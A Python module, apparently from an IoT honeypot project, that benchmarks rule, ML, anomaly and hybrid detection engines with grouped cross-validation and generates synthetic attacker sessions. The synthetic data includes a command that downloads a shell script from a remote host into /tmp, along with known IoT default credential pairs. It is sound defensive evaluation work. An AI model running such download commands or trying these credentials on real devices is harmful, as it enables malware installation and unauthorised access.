"""Reproducible comparison of detection engines with grouped cross-validation.

Methodology (``docs/adr/0005-grouped-evaluation.md``):

* **Unit**: one reconstructed session with events attached.
* **Labels** follow TRAPSIG's experiment semantics (docs/research/EVALUATION.md): an
  attack session is positive only for its expected type; a control session is
  negative for every type. Per-class scores are *positive-vs-control*: other
  attack classes are not counted as negatives, because secondary detections can
  be legitimate. Unexpected detections on other attacks are reported separately.
* **Alerting** (binary) scores every engine, including the anomaly engine which
  predicts no types: alert = "any detection" for attacks vs controls.
* **Splits** are deterministic GroupKFold over ``group`` (experiment, batch or
  attacker), so correlated sessions never straddle train and test. The trained
  ML engine is *also* scored with a naive session-level split; the difference
  (``leakage_inflation``) quantifies what a random split would have overstated.
* **Engines**: ``rules`` (no training), ``ml_bootstrap`` (shipped cold-start
  policy), ``ml_trained`` (retrained per fold, warm-started from bootstrap),
  ``anomaly`` (isolation forest fitted per fold on training controls when there
  are ≥8, otherwise on all training sessions -- recorded), ``hybrid`` (rules ∪
  ml_trained ∪ anomaly, as deployed).
* **Cost**: per-session inference latency (p50/p95, this host) and serialized
  model size; training wall time per fold.
"""

from __future__ import annotations

import json
import math
import random
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from hashlib import sha256
from statistics import fmean, pstdev
from typing import Any, Callable, Iterable, Sequence

from ..ml.bootstrap import DETECTION_TYPES, bootstrap_policy
from ..ml.features import feature_vector
from ..ml.policy import LinearPolicy
from ..ml.training import TrainingExample, train
from ..sessionizer import reconstruct_sessions
from .anomaly import IsolationForest
from .rules import RuleSet, default_ruleset

COMPARISON_INDEX = "trapsig-comparisons"
ENGINES = ("rules", "ml_bootstrap", "ml_trained", "anomaly", "hybrid")


@dataclass
class LabeledSession:
    session: dict[str, Any]
    trial_kind: str  # "attack" | "control"
    expected: str | None
    group: str
    provenance: str  # "logged" | "synthetic"
    vector: list[float] = field(default_factory=list)

    def __post_init__(self) -> None:
        if not self.vector:
            self.vector = feature_vector(self.session)


# --------------------------------------------------------------------------- #
# Splitting
# --------------------------------------------------------------------------- #


def group_kfold(groups: Sequence[str], k: int, seed: int) -> list[list[int]]:
    """Deterministic GroupKFold: returns test-index lists; no group spans two folds.

    Groups are shuffled with ``seed`` then assigned largest-first to the currently
    smallest fold, which balances fold sizes without splitting any group.
    """
    unique = sorted(set(groups))
    if len(unique) < 2:
        raise ValueError("grouped cross-validation needs at least two groups")
    k = max(2, min(k, len(unique)))
    random.Random(seed).shuffle(unique)
    members: dict[str, list[int]] = {}
    for index, group in enumerate(groups):
        members.setdefault(group, []).append(index)
    ordered = sorted(unique, key=lambda g: -len(members[g]))  # stable after shuffle for ties
    folds: list[list[int]] = [[] for _ in range(k)]
    for group in ordered:
        smallest = min(range(k), key=lambda f: (len(folds[f]), f))
        folds[smallest].extend(members[group])
    return [sorted(fold) for fold in folds]


def grouped_split(items: Sequence[Any], group_of: Callable[[Any], str], val_fraction: float, seed: int) -> tuple[list[Any], list[Any]]:
    """Deterministic train/validation split that keeps each group on one side."""
    if val_fraction <= 0 or len(items) < 4:
        return list(items), []
    groups = sorted({group_of(item) for item in items})
    if len(groups) < 2:
        return list(items), []
    random.Random(seed).shuffle(groups)
    target = max(1, int(round(len(items) * val_fraction)))
    validation_groups: set[str] = set()
    count = 0
    sizes: dict[str, int] = {}
    for item in items:
        sizes[group_of(item)] = sizes.get(group_of(item), 0) + 1
    for group in groups:
        if count >= target or len(validation_groups) >= len(groups) - 1:
            break
        validation_groups.add(group)
        count += sizes[group]
    train_items = [item for item in items if group_of(item) not in validation_groups]
    val_items = [item for item in items if group_of(item) in validation_groups]
    return train_items, val_items


def example_group(example: TrainingExample) -> str:
    """Group key for a training example: experiment → batch → source → itself."""
    metadata = example.metadata or {}
    for key in ("experiment_id", "evaluation_batch_id", "source_ip"):
        if metadata.get(key):
            return f"{key}:{metadata[key]}"
    # Deterministic across processes; identical examples (duplicates) share a group.
    content = json.dumps([example.vector, sorted(example.labels.items()), example.source])
    return "example:" + sha256(content.encode()).hexdigest()[:16]


# --------------------------------------------------------------------------- #
# Metrics
# --------------------------------------------------------------------------- #


def _ratio(num: float, den: float) -> float | None:
    return None if den == 0 else num / den


def scores(tp: int, fp: int, fn: int, tn: int) -> dict[str, Any]:
    precision, recall = _ratio(tp, tp + fp), _ratio(tp, tp + fn)
    # 2TP/(2TP+FP+FN) is defined whenever the class has support or false alarms,
    # so a class an engine never predicts scores F1 = 0 instead of vanishing
    # from the macro average (which would flatter engines with missing heads).
    f1 = _ratio(2 * tp, 2 * tp + fp + fn)
    return {
        "tp": tp,
        "fp": fp,
        "fn": fn,
        "tn": tn,
        "precision": precision,
        "recall": recall,
        "f1": f1,
        "fpr": _ratio(fp, fp + tn),
        "fnr": _ratio(fn, fn + tp),
        "support": tp + fn,
    }


def _percentile(values: list[float], q: float) -> float | None:
    if not values:
        return None
    ordered = sorted(values)
    index = min(len(ordered) - 1, max(0, int(math.ceil(q * len(ordered))) - 1))
    return ordered[index]


def evaluate_predictions(samples: Sequence[LabeledSession], predictions: Sequence[set[str]], classes: Iterable[str]) -> dict[str, Any]:
    controls = [i for i, s in enumerate(samples) if s.trial_kind == "control"]
    per_class: dict[str, Any] = {}
    for kind in sorted(set(classes)):
        positives = [i for i, s in enumerate(samples) if s.trial_kind == "attack" and s.expected == kind]
        if not positives:
            continue
        tp = sum(kind in predictions[i] for i in positives)
        fp = sum(kind in predictions[i] for i in controls)
        per_class[kind] = scores(tp, fp, len(positives) - tp, len(controls) - fp)
    f1s = [v["f1"] for v in per_class.values() if v["f1"] is not None]
    attacks = [i for i, s in enumerate(samples) if s.trial_kind == "attack"]
    alert_tp = sum(bool(predictions[i]) for i in attacks)
    alert_fp = sum(bool(predictions[i]) for i in controls)
    unexpected = sum(len(predictions[i] - {samples[i].expected}) for i in attacks)
    return {
        "per_class": per_class,
        "macro_f1": fmean(f1s) if f1s else None,
        "alert": scores(alert_tp, alert_fp, len(attacks) - alert_tp, len(controls) - alert_fp),
        "unexpected_detections_on_attacks": unexpected,
    }


# --------------------------------------------------------------------------- #
# Engines
# --------------------------------------------------------------------------- #


def _rule_types(ruleset: RuleSet, session: dict[str, Any]) -> set[str]:
    return {m.rule.detection_type for m in ruleset.evaluate(session.get("events") or []) if m.rule.detection_type}


def _ml_types(policy: LinearPolicy, vector: list[float]) -> set[str]:
    return {kind for kind, p in policy.probabilities(vector).items() if p >= 0.5}


def _examples(samples: Iterable[LabeledSession]) -> list[TrainingExample]:
    out = []
    for sample in samples:
        if sample.trial_kind == "control":
            labels = {kind: 0 for kind in DETECTION_TYPES}
        elif sample.expected in DETECTION_TYPES:
            labels = {sample.expected: 1}
        else:
            continue  # the learned policy has no head for this class
        out.append(TrainingExample(vector=sample.vector, labels=labels, source=sample.provenance))
    return out


def _timed(fn: Callable[[], set[str]], latencies: list[float]) -> set[str]:
    start = time.perf_counter()
    result = fn()
    latencies.append((time.perf_counter() - start) * 1000.0)
    return result


def compare(
    samples: Sequence[LabeledSession],
    *,
    folds: int = 5,
    seed: int = 20261126,
    epochs: int = 200,
    ruleset: RuleSet | None = None,
    include_naive_split: bool = True,
) -> dict[str, Any]:
    """Run grouped k-fold comparison of every engine; return a JSON-able report."""
    if not samples:
        raise ValueError("no labeled sessions to evaluate")
    ruleset = ruleset or default_ruleset()
    bootstrap = bootstrap_policy()
    classes = {s.expected for s in samples if s.trial_kind == "attack" and s.expected}
    groups = [s.group for s in samples]
    fold_indices = group_kfold(groups, folds, seed)
    predictions: dict[str, list[set[str]]] = {engine: [set() for _ in samples] for engine in ENGINES}
    latencies: dict[str, list[float]] = {engine: [] for engine in ENGINES}
    train_seconds: dict[str, list[float]] = {"ml_trained": [], "anomaly": []}
    model_bytes: dict[str, list[int]] = {"ml_trained": [], "anomaly": []}
    fold_macro: dict[str, list[float]] = {engine: [] for engine in ENGINES}
    anomaly_fit_on: list[str] = []
    for test in fold_indices:
        test_set = set(test)
        train_samples = [s for i, s in enumerate(samples) if i not in test_set]
        started = time.perf_counter()
        trained = train(_examples(train_samples), DETECTION_TYPES, epochs=epochs, warm_start=bootstrap, policy_version="cv-fold")
        train_seconds["ml_trained"].append(time.perf_counter() - started)
        model_bytes["ml_trained"].append(len(json.dumps(trained.to_document())))
        controls = [s.vector for s in train_samples if s.trial_kind == "control"]
        fit_vectors = controls if len(controls) >= 8 else [s.vector for s in train_samples]
        anomaly_fit_on.append("controls" if len(controls) >= 8 else "all-training-sessions")
        forest = None
        if len(fit_vectors) >= 8:
            started = time.perf_counter()
            forest = IsolationForest.fit(fit_vectors, seed=seed)
            train_seconds["anomaly"].append(time.perf_counter() - started)
            model_bytes["anomaly"].append(len(json.dumps(forest.to_document())))
        for i in test:
            sample = samples[i]
            rule_pred = _timed(lambda: _rule_types(ruleset, sample.session), latencies["rules"])
            predictions["rules"][i] = rule_pred
            predictions["ml_bootstrap"][i] = _timed(lambda: _ml_types(bootstrap, sample.vector), latencies["ml_bootstrap"])
            ml_pred = _timed(lambda: _ml_types(trained, sample.vector), latencies["ml_trained"])
            predictions["ml_trained"][i] = ml_pred
            anomaly_pred: set[str] = set()
            if forest is not None:
                anomaly_pred = _timed(lambda: {"ANOMALOUS_BEHAVIOUR"} if forest.score(sample.vector) >= forest.threshold else set(), latencies["anomaly"])
            predictions["anomaly"][i] = anomaly_pred
            predictions["hybrid"][i] = rule_pred | ml_pred | anomaly_pred
        fold_samples = [samples[i] for i in test]
        for engine in ENGINES:
            fold_result = evaluate_predictions(fold_samples, [predictions[engine][i] for i in test], classes)
            if fold_result["macro_f1"] is not None:
                fold_macro[engine].append(fold_result["macro_f1"])
    # Latency of hybrid = sum of its parts (they run sequentially in the processor).
    latencies["hybrid"] = [a + b + c for a, b, c in zip(latencies["rules"], latencies["ml_trained"], latencies["anomaly"] or [0.0] * len(latencies["rules"]))]
    engines_report: dict[str, Any] = {}
    for engine in ENGINES:
        result = evaluate_predictions(samples, predictions[engine], classes)
        result["macro_f1_by_fold"] = [round(v, 6) for v in fold_macro[engine]]
        result["macro_f1_fold_std"] = pstdev(fold_macro[engine]) if len(fold_macro[engine]) > 1 else None
        result["latency_ms"] = {"p50": _percentile(latencies[engine], 0.5), "p95": _percentile(latencies[engine], 0.95), "n": len(latencies[engine])}
        if engine in train_seconds and train_seconds[engine]:
            result["train_seconds_mean"] = fmean(train_seconds[engine])
            result["model_bytes_mean"] = fmean(model_bytes[engine])
        engines_report[engine] = result
    engines_report["ml_bootstrap"]["model_bytes_mean"] = len(json.dumps(bootstrap.to_document()))
    leakage = None
    if include_naive_split:
        leakage = _naive_split_inflation(samples, folds, seed, epochs, bootstrap, classes, engines_report["ml_trained"]["macro_f1"])
    provenance = sorted({s.provenance for s in samples})
    return {
        "report_id": "CMP-" + sha256(f"{seed}|{folds}|{len(samples)}|{ruleset.version}|{datetime.now(timezone.utc).isoformat()}".encode()).hexdigest()[:12],
        "created_at": datetime.now(timezone.utc).isoformat(),
        "provenance": provenance,
        "synthetic_warning": "synthetic" in provenance,
        "sessions": len(samples),
        "attack_sessions": sum(s.trial_kind == "attack" for s in samples),
        "control_sessions": sum(s.trial_kind == "control" for s in samples),
        "groups": len(set(groups)),
        "folds": len(fold_indices),
        "seed": seed,
        "classes": sorted(classes),
        "ruleset_version": ruleset.version,
        "bootstrap_policy_version": bootstrap.policy_version,
        "anomaly_fit_on": sorted(set(anomaly_fit_on)),
        "leakage_check": {"groups_spanning_folds": _groups_spanning(fold_indices, groups), "naive_split": leakage},
        "confidence_note": "ML/anomaly scores are uncalibrated; rule confidence is an author prior.",
        "engines": engines_report,
    }


def _groups_spanning(fold_indices: list[list[int]], groups: Sequence[str]) -> int:
    seen: dict[str, int] = {}
    spanning = set()
    for fold_number, fold in enumerate(fold_indices):
        for index in fold:
            group = groups[index]
            if group in seen and seen[group] != fold_number:
                spanning.add(group)
            seen[group] = fold_number
    return len(spanning)


def _naive_split_inflation(samples, folds, seed, epochs, bootstrap, classes, grouped_macro) -> dict[str, Any]:
    indices = list(range(len(samples)))
    random.Random(seed).shuffle(indices)
    k = max(2, min(folds, len(samples)))
    naive_folds = [indices[f::k] for f in range(k)]
    predictions: list[set[str]] = [set() for _ in samples]
    for test in naive_folds:
        test_set = set(test)
        trained = train(
            _examples([s for i, s in enumerate(samples) if i not in test_set]), DETECTION_TYPES, epochs=epochs, warm_start=bootstrap, policy_version="cv-naive"
        )
        for i in test:
            predictions[i] = _ml_types(trained, samples[i].vector)
    naive_macro = evaluate_predictions(samples, predictions, classes)["macro_f1"]
    inflation = None if naive_macro is None or grouped_macro is None else naive_macro - grouped_macro
    return {"ml_trained_macro_f1_random_split": naive_macro, "ml_trained_macro_f1_grouped": grouped_macro, "leakage_inflation": inflation}


# --------------------------------------------------------------------------- #
# Data sources
# --------------------------------------------------------------------------- #


def labeled_from_experiments(pairs: Iterable[tuple[dict[str, Any], list[dict[str, Any]]]]) -> list[LabeledSession]:
    """Completed, conclusive experiments → labeled sessions (group = experiment)."""
    out: list[LabeledSession] = []
    for experiment, sessions in pairs:
        if experiment.get("result") in {None, "INCONCLUSIVE"}:
            continue
        linked = set(experiment.get("session_ids") or [])
        chosen = [s for s in sessions if not linked or s.get("session_id") in linked]
        kind = experiment.get("trial_kind", "attack")
        expected = experiment.get("expected_detection") if kind == "attack" else None
        if kind == "attack" and not expected:
            continue
        group = experiment.get("experiment_id") or experiment.get("evaluation_batch_id") or experiment.get("attacker_ip") or "unknown"
        out.extend(LabeledSession(session=s, trial_kind=kind, expected=expected, group=str(group), provenance="logged") for s in chosen)
    return out


_EPOCH = datetime(2026, 1, 1, tzinfo=timezone.utc)
_PATHS = (
    "/",
    "/login",
    "/admin",
    "/config",
    "/status",
    "/setup",
    "/network",
    "/system",
    "/firmware",
    "/device",
    "/cgi-bin/luci",
    "/HNAP1/",
    "/backup",
    "/api/v1/info",
)
_USERS = ("root", "admin", "support", "user", "guest", "ubnt", "pi", "service", "operator")
_COMMANDS = ("uname -a", "id", "cat /proc/cpuinfo", "ls /tmp", "ps", "cd /tmp; wget http://198.51.100.9/b.sh", "/bin/busybox KXQW", "free -m", "echo ok")


def synthetic_corpus(seed: int = 7, attackers_per_archetype: int = 6, sessions_per_attacker: int = 4) -> list[LabeledSession]:
    """Event-level synthetic sessions with *attacker-correlated* groups.

    Each synthetic attacker draws a style (intensity, wordlist, pacing) once and
    produces several similar sessions, so a random split leaks style across
    train/test exactly as repeated lab runs from one host would. Includes hard
    cases rules miss by design (low-and-slow guessing) and ICS classes the learned
    policy has no head for. **Synthetic; never report as measured lab results.**
    """
    rng = random.Random(seed)
    samples: list[LabeledSession] = []
    counter = [0]

    def ev(t: float, ip: str, service: str, protocol: str, **fields: Any) -> dict[str, Any]:
        counter[0] += 1
        event = {
            "@timestamp": (_EPOCH + timedelta(seconds=t)).isoformat().replace("+00:00", "Z"),
            "event": {
                "id": f"syn-{counter[0]}",
                "category": fields.pop("category", "network"),
                "outcome": fields.pop("outcome", "unknown"),
                "action": fields.pop("action", "request"),
            },
            "source": {"ip": ip},
            "destination": {"ip": "192.168.50.10"},
            "service": {"name": service},
            "network": {"protocol": protocol, "transport": "udp" if protocol in {"coap", "dns", "ssdp"} else "tcp"},
            "honeypot": {"id": f"{service}-01"},
        }
        event.update(fields)
        return event

    def archetype_events(name: str, style: dict[str, Any], ip: str, t0: float) -> list[dict[str, Any]]:
        out: list[dict[str, Any]] = []
        t = t0
        if name == "control-web":
            for path in rng.sample(_PATHS[:4], rng.randint(1, 2)):
                out.append(ev(t, ip, rng.choice(["camera", "router"]), "http", category="web", url={"path": path}))
                t += rng.uniform(2, 20)
        elif name == "control-login":
            out.append(
                ev(
                    t,
                    ip,
                    "cowrie",
                    "ssh",
                    category="authentication",
                    outcome="failure",
                    action="login_attempt",
                    authentication={"username": "operator", "password": "Tr1cky-" + str(rng.randint(10, 99))},
                )
            )
        elif name == "control-mqtt":
            out.append(ev(t, ip, "mqtt", "mqtt", mqtt={"operation": "connect"}))
        elif name == "control-modbus":
            out.append(ev(t, ip, "plc", "modbus", modbus={"function_code": 3, "address": 0, "quantity": 2}))
        elif name == "BRUTE_FORCE":
            for _ in range(style["attempts"] + rng.randint(-1, 2)):
                out.append(
                    ev(
                        t,
                        ip,
                        style["service"],
                        "ssh" if style["service"] == "cowrie" else "http",
                        category="authentication",
                        outcome="failure",
                        action="login_attempt",
                        authentication={"username": rng.choice(style["users"]), "password": f"pw{rng.randint(0, 9999)}"},
                    )
                )
                t += rng.uniform(*style["gap"])
        elif name == "DEFAULT_CREDENTIALS":
            pair = style["pair"]
            for _ in range(rng.randint(1, 2)):
                out.append(
                    ev(
                        t,
                        ip,
                        style["service"],
                        "http",
                        category="authentication",
                        outcome="success" if rng.random() < 0.5 else "failure",
                        action="login_attempt",
                        authentication={"username": pair[0], "password": pair[1]},
                    )
                )
                t += rng.uniform(1, 5)
        elif name == "WEB_ENUMERATION":
            for path in rng.sample(_PATHS, min(len(_PATHS), style["paths"] + rng.randint(-1, 2))):
                out.append(ev(t, ip, style["service"], "http", category="web", url={"path": path}))
                t += rng.uniform(0.2, 3)
        elif name == "COMMAND_INTERACTION":
            out.append(
                ev(
                    t,
                    ip,
                    "cowrie",
                    "ssh",
                    category="authentication",
                    outcome="success",
                    action="login_attempt",
                    authentication={"username": "root", "password": "root"},
                )
            )
            for command in rng.sample(_COMMANDS, style["commands"]):
                t += rng.uniform(0.5, 4)
                out.append(ev(t, ip, "cowrie", "ssh", category="process", action="command", process={"command_line": command}))
        elif name == "MQTT_PROBING":
            out.append(ev(t, ip, "mqtt", "mqtt", mqtt={"operation": "connect"}))
            for _ in range(style["ops"]):
                t += rng.uniform(0.2, 2)
                out.append(
                    ev(
                        t,
                        ip,
                        "mqtt",
                        "mqtt",
                        mqtt={"operation": rng.choice(["subscribe", "publish"]), "topic": rng.choice(["#", "$SYS/#", "home/+/state", "sensors/temp"])},
                    )
                )
        elif name == "RECONNAISSANCE":
            for _ in range(style["probes"]):
                out.append(ev(t, ip, "iot-service", "tcp", iot={"operation": rng.choice(["status", "version", "info", "help"])}))
                t += rng.uniform(0.5, 5)
        elif name == "MULTI_SERVICE_ACTIVITY":
            for service, protocol in rng.sample(
                [("camera", "http"), ("router", "http"), ("mqtt", "mqtt"), ("iot-service", "tcp"), ("cowrie", "ssh")], style["services"]
            ):
                out.append(ev(t, ip, service, protocol))
                t += rng.uniform(1, 30)
        elif name == "ICS_WRITE":
            out.append(ev(t, ip, "plc", "modbus", modbus={"function_code": 3, "address": 0}))
            for _ in range(rng.randint(1, 3)):
                t += rng.uniform(0.5, 3)
                out.append(ev(t, ip, "plc", "modbus", modbus={"function_code": rng.choice([5, 6, 16]), "address": rng.randint(0, 50)}))
        elif name == "ICS_RECONNAISSANCE":
            out.append(ev(t, ip, "plc", "modbus", modbus={"function_code": 43}))
            for address in rng.sample(range(0, 200, 10), style["reads"]):
                t += rng.uniform(0.2, 2)
                out.append(ev(t, ip, "plc", "modbus", modbus={"function_code": rng.choice([1, 3, 4]), "address": address}))
        return out

    archetypes: dict[str, Callable[[], dict[str, Any]]] = {
        "control-web": dict,
        "control-login": dict,
        "control-mqtt": dict,
        "control-modbus": dict,
        "BRUTE_FORCE": lambda: {
            "attempts": rng.choice([4, 5, 8, 15, 30]),
            "gap": rng.choice([(0.2, 2.0), (0.2, 2.0), (80.0, 120.0)]),  # some attackers are low-and-slow
            "service": rng.choice(["cowrie", "cowrie", "camera"]),
            "users": rng.sample(_USERS, rng.randint(1, 3)),
        },
        "DEFAULT_CREDENTIALS": lambda: {
            "pair": rng.choice([("admin", "admin"), ("root", "xc3511"), ("admin", "1234"), ("pi", "raspberry")]),
            "service": rng.choice(["camera", "router"]),
        },
        "WEB_ENUMERATION": lambda: {"paths": rng.randint(5, 12), "service": rng.choice(["camera", "router"])},
        "COMMAND_INTERACTION": lambda: {"commands": rng.randint(1, 5)},
        "MQTT_PROBING": lambda: {"ops": rng.randint(1, 4)},
        "RECONNAISSANCE": lambda: {"probes": rng.randint(3, 8)},
        "MULTI_SERVICE_ACTIVITY": lambda: {"services": rng.randint(3, 5)},
        "ICS_WRITE": dict,
        "ICS_RECONNAISSANCE": lambda: {"reads": rng.randint(5, 10)},
    }
    attacker = 0
    for name, style_factory in archetypes.items():
        for _ in range(attackers_per_archetype):
            attacker += 1
            ip = f"192.168.50.{20 + attacker % 200}"
            style = style_factory()
            for repetition in range(sessions_per_attacker):
                # Sessions of one attacker are separated by > session timeout.
                t0 = attacker * 100_000 + repetition * 10_000
                events = archetype_events(name, style, ip, t0)
                for session in reconstruct_sessions(events, 300):
                    control = name.startswith("control-")
                    samples.append(
                        LabeledSession(
                            session=session,
                            trial_kind="control" if control else "attack",
                            expected=None if control else name,
                            group=f"attacker-{attacker}",
                            provenance="synthetic",
                        )
                    )
    return samples
